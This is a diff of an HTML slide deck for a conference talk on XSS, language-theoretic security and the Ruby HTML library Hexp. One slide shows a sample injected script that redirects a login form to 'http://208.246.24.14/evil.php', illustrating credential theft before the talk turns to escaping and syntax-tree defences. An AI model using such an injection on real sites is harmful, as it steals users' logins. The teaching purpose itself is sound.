@@ -8,73 +8,76 @@
 <script src="http://code.jquery.com/jquery-1.10.1.min.js"></script><script src="file:///home/arne/github/conf-talks/2013-eurucamp/javascripts/impress_js_addons.js"></script><script src="file:///home/arne/github/conf-talks/2013-eurucamp/javascripts/highlight.pack.js"></script><script>hljs.initHighlightingOnLoad();</script>
 </head>
 <body id="impress" data-transition-duration="0">
-<div>
+<div class="step" data-x="1000" data-y="0">
 <h1>Web Linguistics</h1>
 <h2>Towards Higher Fluency</h2>
 <p>by Arne Brasseur / <a href="https://github.com/plexus">plexus</a></p>
 </div>
-<div class="step" data-x="1000" data-y="0">
+<div class="step" data-x="2000" data-y="0">
 <p>Moi</p>
 <p>Freelance Ruby Dev</p>
 <p>Shoes, Rails Girls Berlin, Ruby Monsters</p>
 <p>Twitter / Github : @plexus</p>
 </div>
-<div class="step" data-x="2000" data-y="0">
+<div class="step" data-x="3000" data-y="0">
 <p><img src="images/yaml_new_eval.png" alt="Screenshot of the Langsec website (langsec.org)"></p>
 </div>
-<div class="step" data-x="3000" data-y="0">
+<div class="step" data-x="4000" data-y="0">
 <h1>XSS</h1>
 <h2>Cross site scripting</h2>
 
 </div>
-<div class="big step" data-x="4000" data-y="0">
+<div class="step" data-x="5000" data-y="0">
 <p>XSS enables attackers to inject client-side script into Web pages viewed by other users</p>
 </div>
-<div class="step" data-x="5000" data-y="0">
-<h2>XSS</h2>
-<p>Code like this</p>
-<pre class="language-ruby"><code class="prettyprint ruby">"&lt;div&gt;#{ @post.body }&lt;/div&gt;"
-</code></pre>
-<p>Will lead to malicious injection</p>
-<pre class="language-html"><code>&lt;script&gt;
+<div class="step" data-x="6000" data-y="0">
+<p>A simple comment form</p>
+<form>
+  <label>Add a comment</label><br>
+  <textarea rows="5" cols="80">
+<script>
  document.getElementById('login_form').
    action="http://208.246.24.14/evil.php"
-&lt;/script&gt;
-</code></pre>
-</div>
-<div class="step" data-x="6000" data-y="0">
-<p><strong>session hijacking</strong></p>
-<p>attacker can surf the site with user credentials</p>
+</script>
+</textarea><br>
+  <input type="submit">
+</form>
 </div>
 <div class="step" data-x="7000" data-y="0">
-<h2>Escape!</h2>
+<p>We naively display the comment</p>
+<pre class="language-ruby"><code class="prettyprint ruby">"&lt;div class='comment'&gt;#{ comment }&lt;/div&gt;"
+</code></pre>
+</div>
+<div class="step" data-x="8000" data-y="0">
+<p>Each time someone visits our site,
+<br>the malicious code gets executed.</p>
+</div>
+<div class="step" data-x="9000" data-y="0">
 <p>The common wisdom is to &ldquo;escape&rdquo; the inserted value</p>
-<pre class="language-html"><code>&lt;div&gt;#{ escape_html(@post.body) }&lt;/div&gt;
+<pre class="language-html"><code>&lt;div class='comment'&gt;#{ escape_html(comment) }&lt;/div&gt;
 </code></pre>
 <p>Now the code is harmless</p>
-<pre class="language-html"><code>&lt;div&gt;
+<pre class="language-html"><code>&lt;div class='comment'&gt;
   &amp;lt;script&amp;gt; ... &amp;lt;/script&amp;gt;
 &lt;/div&gt;
 </code></pre>
 </div>
-<div class="step" data-x="8000" data-y="0">
-<h2>XSS</h2>
-<p>Is a more common</p>
-<p>vulnerability than</p>
-<p>buffer overflows</p>
+<div class="step" data-x="10000" data-y="0">
+<p>But XSS is still rampant,
+<br>more common than buffer overflows</p>
 </div>
-<div class="step" data-x="9000" data-y="0">
+<div class="step" data-x="11000" data-y="0">
 <p><strong>why</strong> is it so <strong>hard?</strong></p>
 </div>
-<div class="step" data-x="10000" data-y="0">
+<div class="step" data-x="12000" data-y="0">
 <p>Manual escaping? <strong>hard</strong></p>
 <p>Let&rsquo;s automate!</p>
 <pre class="language-html"><code># using HTML::SafeBuffer
-&lt;div&gt;&lt;%= @post.body %&gt;&lt;/div&gt;
+&lt;div class='comment'&gt;&lt;%= comment %&gt;&lt;/div&gt;
 </code></pre>
 <p>And it <strong>just works</strong></p>
 </div>
-<div class="step" data-x="11000" data-y="0">
+<div class="step" data-x="13000" data-y="0">
 <p>We&rsquo;ve turned the problem around</p>
 <p>Whitelist instead of blacklist</p>
 <pre class="language-ruby"><code class="prettyprint ruby">def helper
@@ -83,23 +86,38 @@ end
 </code></pre>
 <p><strong>We&rsquo;re still manually deciding what (not) to escape</strong></p>
 </div>
-<div class="step" data-x="12000" data-y="0">
+<div class="step" data-x="14000" data-y="0">
+<h1>The String Problem</h1>
+</div>
+<div class="step" data-x="15000" data-y="0">
 <p><img src="images/devil_in_plain_text.png" alt="Screenshot of the Langsec website (langsec.org)"></p>
 </div>
-<div class="step" data-x="13000" data-y="0">
+<div class="step" data-x="16000" data-y="0">
+<h2>The problem</h2>
+<p>Semantics of string are twofold</p>
+<ul>
+<li><p>a string</p></li>
+<li><p>a textual representation of HTML</p></li>
+</ul>
+</div>
+<div class="step" data-x="17000" data-y="0">
+<p>HTML is structured data,
+<br>let&rsquo;s treat it as such</p>
+</div>
+<div class="step" data-x="18000" data-y="0">
 <p><img src="images/langsec_website.png" alt="Screenshot of the Langsec website (langsec.org)"></p>
 </div>
-<div class="step" data-x="14000" data-y="0">
+<div class="step" data-x="19000" data-y="0">
 <h1>Language</h1>
 <h2>langue, taal, sprache, &#35486;&#35328;</h2>
 </div>
-<div class="step" data-x="15000" data-y="0">
+<div class="step" data-x="20000" data-y="0">
 <p><img src="images/platypus_cloud.png" alt=""></p>
 </div>
-<div class="step" data-x="16000" data-y="0">
+<div class="step" data-x="21000" data-y="0">
 <p><img src="images/platypus_graph.png" alt=""></p>
 </div>
-<div class="step" data-x="17000" data-y="0">
+<div class="step" data-x="22000" data-y="0">
 <svg width="304pt" height="262pt" viewBox="0.00 0.00 304.00 262.00">
 <g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 258)">
 <title>platypus</title>
@@ -185,13 +203,13 @@ end
 </svg>
 
 </div>
-<div class="step" data-x="18000" data-y="0">
+<div class="step" data-x="23000" data-y="0">
 <p><span class="box">A platypus</span><span class="box">is carrying</span><span class="box">a chicken</span><span class="box">in the forest</span></p>
 </div>
-<div class="step" data-x="19000" data-y="0">
+<div class="step" data-x="24000" data-y="0">
 <p><img src="images/waveform.gif" alt=""></p>
 </div>
-<div class="step" data-x="20000" data-y="0">
+<div class="step" data-x="25000" data-y="0">
 <h2>Magic of language</h2>
 <ul>
 <li><p>Listener reconstructs abstract representation</p></li>
@@ -199,52 +217,40 @@ end
 <li><p>Each derive meaning from this representation</p></li>
 </ul>
 </div>
-<div class="step" data-x="21000" data-y="0">
+<div class="step" data-x="26000" data-y="0">
 <h1>Formal Language</h1>
 </div>
-<div class="step" data-x="22000" data-y="0">
-<p>a <strong>formal language</strong> is</p>
-<p>a <strong>set of strings</strong> of symbols</p>
-<p>governed by <strong>strict rules</strong></p>
+<div class="step" data-x="27000" data-y="0">
+<p>a <strong>formal language</strong> is
+<br>a <strong>set of strings</strong> of symbols
+<br>governed by <strong>strict rules</strong></p>
 </div>
-<div class="step" data-x="23000" data-y="0">
-<p>These rules form the <strong>grammar</strong></p>
-<p>of the language, they specify</p>
-<p>how to <strong>generate</strong> valid strings</p>
-</div>
-<div class="step" data-x="24000" data-y="0">
+<div class="step" data-x="28000" data-y="0">
 <pre><code>alphabet = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
             +, *, (, ), =}
+</code></pre>
+</div>
+<div class="step" data-x="29000" data-y="0">
+<p>These rules form the <strong>grammar</strong>
+<br>of the language, they specify
+<br>how to <strong>generate</strong> valid strings</p>
+</div>
+<div class="step" data-x="30000" data-y="0">
+<pre><code>&lt;EQUATION&gt;   ::= &lt;sum&gt; = &lt;sum&gt;
 
-&lt;equation&gt;   ::= &lt;expression&gt; = &lt;expression&gt;
-
-&lt;expression&gt; ::= &lt;number&gt;  | &lt;sum&gt; |
-                 &lt;product&gt; | ( &lt;expression&gt; )
-
-&lt;number&gt;     ::= &lt;digit&gt; | &lt;digit&gt; &lt;number&gt;
-
-&lt;digit&gt;      ::= 0 | 1 | 2 | 3 | 4 |
+&lt;digit &gt;     ::= 0 | 1 | 2 | 3 | 4 |
                  5 | 6 | 7 | 8 | 9
 
-&lt;sum&gt;        ::= &lt;expression&gt; + &lt;expression&gt;
-
-&lt;product&gt;    ::= &lt;expression&gt; * &lt;expression&gt;
+&lt;sum&gt;        ::= *&lt;digit&gt; + *&lt;digit&gt;
 </code></pre>
 </div>
-<div class="step" data-x="25000" data-y="0">
-<p>well-formed :</p>
-<pre><code>5 = 3 + 2
-4 * 4 = 10 + 6
-10 + 20 = ( 3 + 5 ) * 7
-</code></pre>
-<p>not well-formed :</p>
-<pre><code>5 = + 5
-10 = 15 - 5
-3 * 5 + 7
-</code></pre>
+<div class="step" data-x="31000" data-y="0">
+<p>We can represent
+<br>how the grammar rules are applied
+<br>using a <strong>syntax tree</strong></p>
 </div>
-<div class="step" data-x="26000" data-y="0">
-<svg width="486pt" height="404pt" viewBox="0.00 0.00 486.00 404.00">
+<div class="step" data-x="32000" data-y="0">
+<svg viewBox="0.00 0.00 486.00 404.00" width="850px">
 <g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 400)">
 <title>_anonymous_0</title>
 
@@ -407,12 +413,12 @@ end
 </g>
 </svg>
 </div>
-<div class="step" data-x="27000" data-y="0">
-<p>The <strong>meaning</strong> of a sentence</p>
-<p>corresponds with</p>
-<p>its <strong>syntax tree</strong></p>
+<div class="step" data-x="33000" data-y="0">
+<p>The <strong>meaning</strong> of a sentence
+<br>corresponds with
+<br>its <strong>syntax tree</strong></p>
 </div>
-<div class="step" data-x="28000" data-y="0">
+<div class="step" data-x="34000" data-y="0">
 <h2>Language is everywhere</h2>
 <ul>
 <li><p>Programming languages</p></li>
@@ -421,35 +427,27 @@ end
 <li><p>Network protocols</p></li>
 </ul>
 </div>
-<div class="step" data-x="29000" data-y="0">
-<p>Your application either</p>
-<p><strong>consumes</strong> or <strong>generates</strong></p>
-<p>these languages</p>
+<div class="step" data-x="35000" data-y="0">
+<p>Your application either
+<br><strong>consumes</strong> or <strong>generates</strong>
+<br>these languages</p>
 </div>
-<div class="step" data-x="30000" data-y="0">
-<p>In either case it should</p>
-<p>use <strong>syntax trees</strong></p>
-<p>to do so</p>
+<div class="step" data-x="36000" data-y="0">
+<p>In either case it should
+<br>use <strong>syntax trees</strong>
+<br>to do so</p>
 </div>
-<div class="step" data-x="31000" data-y="0">
-<h1>Why ?</h1>
+<div class="step" data-x="37000" data-y="0">
+<h1>#langsec</h1>
 </div>
-<div class="step" data-x="32000" data-y="0">
-<h2>The problem</h2>
-<p>Semantics of string are twofold</p>
-<ul>
-<li><p>a string</p></li>
-<li><p>a textual representation of HTML</p></li>
-</ul>
-</div>
-<div class="step" data-x="33000" data-y="0">
+<div class="step" data-x="38000" data-y="0">
 <p>When handling input</p>
 <ul>
 <li><p>Treat it as a formal language</p></li>
 <li><p>Separate recognition from processing</p></li>
 </ul>
 </div>
-<div class="step" data-x="34000" data-y="0">
+<div class="step" data-x="39000" data-y="0">
 <p>If input handling is done ad-hoc</p>
 <ul>
 <li><p>recognition is scattered across the program</p></li>
@@ -457,21 +455,21 @@ end
 <li><p>it becomes a weird machine for an attacker to program</p></li>
 </ul>
 </div>
-<div class="step" data-x="35000" data-y="0">
-<p>http://langsec.org</p>
-<p>Meredith L. Patterson : &ldquo;The Science of Insecurity&rdquo;</p>
+<div class="step" data-x="40000" data-y="0">
+<p><a href="http://langsec.org">Language-Theoretic security research</a></p>
+<p>Meredith L. Patterson : <strong>&ldquo;The Science of Insecurity&rdquo;</strong></p>
 </div>
-<div class="step" data-x="36000" data-y="0">
+<div class="step" data-x="41000" data-y="0">
 <p>We can apply similar reasoning to <strong>output</strong> handling</p>
 </div>
-<div class="step" data-x="37000" data-y="0">
+<div class="step" data-x="42000" data-y="0">
 <p>When generating output</p>
 <ul>
 <li><p>Treat it as a formal language</p></li>
 <li><p>Separate language generation from program logic</p></li>
 </ul>
 </div>
-<div class="step" data-x="38000" data-y="0">
+<div class="step" data-x="43000" data-y="0">
 <p>If output handling is done ad-hoc</p>
 <ul>
 <li><p>language generation is scattered across the program</p></li>
@@ -479,10 +477,10 @@ end
 <li><p>it becomes a weird machine for an attacker to program</p></li>
 </ul>
 </div>
-<div class="step" data-x="39000" data-y="0">
-<h1>XSS is a Failure at the Language Level</h1>
+<div class="step" data-x="44000" data-y="0">
+<p>XSS is a Failure at the Language Level</p>
 </div>
-<div class="step" data-x="40000" data-y="0">
+<div class="step" data-x="45000" data-y="0">
 <svg width="518pt" height="188pt" viewBox="0.00 0.00 518.00 188.00">
 <g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 184)">
 <title>commmunication</title>
@@ -607,7 +605,7 @@ end
 </g>
 </svg>
 </div>
-<div class="step" data-x="41000" data-y="0">
+<div class="step" data-x="46000" data-y="0">
 <svg width="518pt" height="332pt" viewBox="0.00 0.00 518.00 332.00">
 <g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 328)">
 <title>commmunication</title>
@@ -626,7 +624,7 @@ end
 </g>
 <comment></comment>
 <g id="edge24" class="edge"><title>c-&gt;f</title>
-<path fill="none" stroke="red" stroke-width="3" d="M377.601,-144.937C373.297,-133.46 367.647,-118.392 363.353,-106.941"></path>
+<path fill="none" stroke="white" stroke-width="3" d="M377.601,-144.937C373.297,-133.46 367.647,-118.392 363.353,-106.941"></path>
 </g>
 <comment></comment>
 <g id="node4" class="node"><title>g</title>
@@ -634,7 +632,7 @@ end
 </g>
 <comment></comment>
 <g id="edge26" class="edge"><title>c-&gt;g</title>
-<path fill="none" stroke="red" stroke-width="3" d="M390.399,-144.937C394.703,-133.46 400.353,-118.392 404.647,-106.941"></path>
+<path fill="none" stroke="white" stroke-width="3" d="M390.399,-144.937C394.703,-133.46 400.353,-118.392 404.647,-106.941"></path>
 </g>
 <comment></comment>
 <g id="node5" class="node"><title>h</title>
@@ -642,7 +640,7 @@ end
 </g>
 <comment></comment>
 <g id="edge28" class="edge"><title>g-&gt;h</title>
-<path fill="none" stroke="red" stroke-width="3" d="M411,-71.8314C411,-61 411,-47.2876 411,-36.4133"></path>
+<path fill="none" stroke="white" stroke-width="3" d="M411,-71.8314C411,-61 411,-47.2876 411,-36.4133"></path>
 </g>
 <comment></comment>
 <g id="node7" class="node"><title>x1</title>
@@ -756,48 +754,209 @@ end
 </g>
 </svg>
 </div>
-<div class="step" data-x="42000" data-y="0">
+<div class="step" data-x="47000" data-y="0">
 <h1>Abolish Your Templates, Burn Your Helpers</h1>
 </div>
-<div class="step" data-x="43000" data-y="0">
-<h1>Preventing XSS Through Architecture</h1>
-</div>
-<div class="step" data-x="44000" data-y="0">
-<p>Other examples
-<br>- Yesod
-<br>- Noinject</p>
-</div>
-<div class="step" data-x="45000" data-y="0">
-<h1>Hexp</h1>
-</div>
-<div class="step" data-x="46000" data-y="0">
-<h2>Creating nodes</h2>
-<ul>
-<li><p>object</p></li>
-<li><p>sexp</p></li>
-<li><p>builder</p></li>
-</ul>
-</div>
-<div class="step" data-x="47000" data-y="0">
-<h2>Manipulating Nodes</h2>
-</div>
 <div class="step" data-x="48000" data-y="0">
-<h1>Other use cases</h1>
-<ul>
-<li><p>deface</p></li>
-<li><p>populate forms</p></li>
-<li><p>pretty print</p></li>
-<li><p>self contained</p></li>
-</ul>
+<p>Create a HTML <strong>data structure</strong>
+<br>Serialize it <strong>in one pass</strong>
+<br>In <strong>pure Ruby</strong></p>
 </div>
 <div class="step" data-x="49000" data-y="0">
-<h1>Modular (think : CMS)</h1>
-<ul><li><p>discount module</p></li></ul>
+<h1>Hexp</h1>
 </div>
 <div class="step" data-x="50000" data-y="0">
-<h1>Working with designers</h1>
-<ul><li><p>Living Styleguide FTW</p></li></ul>
+<p>An API for <strong>generating</strong>
+<br>and <strong>manipulating</strong>
+<br><strong>HTML</strong> syntax trees</p>
 </div>
-<script src="file:///home/arne/github/hexpress/js/impress.js"></script><script>impress().init();</script>
+<div class="step" data-x="51000" data-y="0">
+<p>What <strong>Rack</strong> does for <strong>HTTP</strong>
+<br><strong>Hexp</strong> does for <strong>HTML</strong></p>
+</div>
+<div class="step" data-x="52000" data-y="0">
+<h1>Creating nodes</h1>
+</div>
+<div class="step" data-x="53000" data-y="0">
+<h2>Objects</h2>
+<pre class="language-ruby"><code class="prettyprint ruby">div = Hexp::Node.new(:div, class: 'strong')
+# =&gt; H[:div, {"class" =&gt; "strong"}]
+</code></pre>
+</div>
+<div class="step" data-x="54000" data-y="0">
+<h2>Builder syntax</h2>
+<pre class="language-ruby"><code class="prettyprint ruby">list = Hexp.build do
+  ul do
+   3.times do |i|
+     li i.to_s
+   end
+  end
+end
+# =&gt; H[:ul, [H[:li, ["0"]], H[:li, ["1"]], H[:li, ["2"]]]]
+</code></pre>
+</div>
+<div class="step" data-x="55000" data-y="0">
+<h2>S-expressions</h2>
+<pre class="language-ruby"><code class="prettyprint ruby">toc = H[:ol, {class: 'toc'}, [
+    H[:li, 'Language Theory'],
+    H[:li, 'XSS'],
+    H[:li, 'Applications']
+  ]
+]
+</code></pre>
+</div>
+<div class="step" data-x="56000" data-y="0">
+<h2>Manipulating Nodes</h2>
+<pre class="language-ruby"><code class="prettyprint ruby">doc.rewrite('head') do |head|
+  head.add(H[:script,
+    src: 'http://code.jquery.com/jquery-1.10.1.min.js'])
+end
+</code></pre>
+<pre class="language-ruby"><code class="prettyprint ruby">div.add_class('sidebar')
+</code></pre>
+</div>
+<div class="step" data-x="57000" data-y="0">
+<h2>Reusable &lsquo;Middleware&rsquo;</h2>
+<p>For example</p>
+<ul>
+<li><p>Inline CSS/JS/images</p></li>
+<li><p>Pretty print</p></li>
+<li><p>Populate forms (cfr. Formless)</p></li>
+</ul>
+</div>
+<div class="step" data-x="58000" data-y="0">
+<h2>Reusable widgets</h2>
+<ul>
+<li><p>Menus</p></li>
+<li><p>Breadcrumbs</p></li>
+<li><p>Forms</p></li>
+<li><p>Header / Footer</p></li>
+</ul>
+<p>cfr. <a href="https://github.com/begriffs/showpiece">Showpiece</a></p>
+</div>
+<div class="step" data-x="59000" data-y="0">
+<h2>Example : discount module</h2>
+<pre class="language-ruby"><code class="prettyprint ruby">doc.rewrite('form.checkout input[type=submit]') do |submit|
+  [ discount_form_field, submit ]
+end
+
+def discount_form_field
+  Hexp.build do
+    div do
+      label 'Discount code', for: 'discount'
+      input name: 'discount', type: 'text'
+    end
+  end
+end
+</code></pre>
+</div>
+<div class="step" data-x="60000" data-y="0">
+<h2>Example Widget</h2>
+<pre class="language-ruby"><code class="prettyprint ruby">class BookWidget &lt; Struct.new(:book, :tag)
+  include Hexp
+
+  def to_hexp
+    H[tag, {class: 'book-entry', id: "book-#{book.id}"}, [
+        H[:h2, book.title],
+        H[:img, src: book.image.url(:medium)]
+      ]
+    ]
+  end
+end
+</code></pre>
+</div>
+<div class="step" data-x="61000" data-y="0">
+<p>with include Hexp all DSL methods redirect to to_hexp</p>
+<p>tag, attributes, children, attr, rewrite, select, to_html, class?, add_class, add_child, add, process, %, text, remove_attr, set_attributes</p>
+</div>
+<div class="step" data-x="62000" data-y="0">
+<h2>Hexpress</h2>
+<ul>
+<li><p>Converts Markdown to Hexp</p></li>
+<li>
+<p>Contains a bunch of &lsquo;Processors&rsquo;
+</p>
+<ul>
+<li><p>AddImpressJs</p></li>
+<li><p>GraphvizDotToSVG</p></li>
+<li><p>MakeSelfContained</p></li>
+</ul>
+</li>
+<li><p>Powers this presentation</p></li>
+</ul>
+</div>
+<div class="step" data-x="63000" data-y="0">
+<h2>Working with designers</h2>
+<ul>
+<li><p>Create widgets with semantic markup</p></li>
+<li><p>Create a Living Styleguide</p></li>
+</ul>
+
+
+</div>
+<div class="step" data-x="64000" data-y="0">
+<p>Q ?</p>
+</div>
+<div class="step" data-x="65000" data-y="0">
+<h1>Thank you!</h1>
+<ul>
+<li><p><a href="http://github.com/plexus/hexp">github.com/plexus/hexp</a></p></li>
+<li><p><a href="http://twitter.com/plexus">twitter.com/plexus</a></p></li>
+<li><p><a href="http://arnebrasseur.net">arnebrasseur.net</a></p></li>
+</ul>
+</div>
+<div class="step" data-x="66000" data-y="0">
+<h1>References</h1>
+</div>
+<div class="step" data-x="67000" data-y="0">
+<h2>Blog posts</h2>
+<ul>
+<li><p><a href="http://acko.net/blog/safe-string-theory-for-the-web/">Safe String Theory for the web</a> by Steven Wittens</p></li>
+<li><p><a href="http://www.more-magic.net/posts/structurally-fixing-injection-bugs.html">Structurally Fixing Injection Bugs</a> by Peter Bex</p></li>
+<li><p><a href="http://adit.io/posts/2012-04-14-working_with_HTML_in_haskell.html">Working with HTML in Haskell</a> by Aditya Bhargava</p></li>
+<li><p><a href="http://blog.moertel.com/posts/2006-10-18-a-type-based-solution-to-the-strings-problem.html">A type-based solution to the &ldquo;strings problem&rdquo;: a fitting end to XSS and SQL-injection holes?</a> by Tom Moertel</p></li>
+<li><p><a href="http://devblog.arnebrasseur.net/2013-04-plain-text">The Devil in Plain Text</a> by Arne Brasseur</p></li>
+</ul>
+</div>
+<div class="step" data-x="68000" data-y="0">
+<h2>Books</h2>
+<ul>
+<li><p>Speaking by Willem J.M. Levelt</p></li>
+<li><p>An Introduction to Formal Languages and Automata by Peter Linz</p></li>
+</ul>
+</div>
+<div class="step" data-x="69000" data-y="0">
+<h2>Security</h2>
+<ul>
+<li><p><a href="http://langsec.org/">Langsec</a></p></li>
+<li><p><a href="http://www.youtube.com/watch?v=3kEfedtQVOY">The Science of Insecurity</a> by Meredith L. Patterson</p></li>
+<li><p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a></p></li>
+</ul>
+</div>
+<div class="step" data-x="70000" data-y="0">
+<h2>Software</h2>
+<p>Ruby</p>
+<ul>
+<li><p><a href="https://github.com/Wardrop/Formless">Formless</a>
+<br>Completely transparent, unobtrusive form populator for web applications and content scrapers</p></li>
+<li><p><a href="https://github.com/flavorjones/loofah">Loofah</a>
+<br>HTML/XML manipulation and sanitization based on Nokogiri</p></li>
+<li><p><a href="https://github.com/hagenburger/livingstyleguide">Living Style Guide</a></p></li>
+</ul>
+<p>Common Lisp</p>
+<ul><li><p><a href="http://jandmworks.com/cl-who-ext.html">CL-WHO</a></p></li></ul>
+</div>
+<div class="step" data-x="71000" data-y="0">
+<h2>Software</h2>
+<p>Haskell</p>
+<ul>
+<li><p><a href="http://jaspervdj.be/blaze/tutorial.html">BlazeHtml</a></p></li>
+<li><p><a href="http://www.yesodweb.com/book/widgets">Yesod framework</a></p></li>
+<li><p>HXT</p></li>
+</ul>
+<p>General</p>
+<ul><li><p><a href="http://begriffs.github.io/showpiece/">Showpiece</a></p></li></ul>
+</div>
+<script src="file:///home/arne/github/hexpress/assets/impress.js/js/impress.js" type="text/javascript"></script><script>impress().init();</script>
 </body>
 </html>
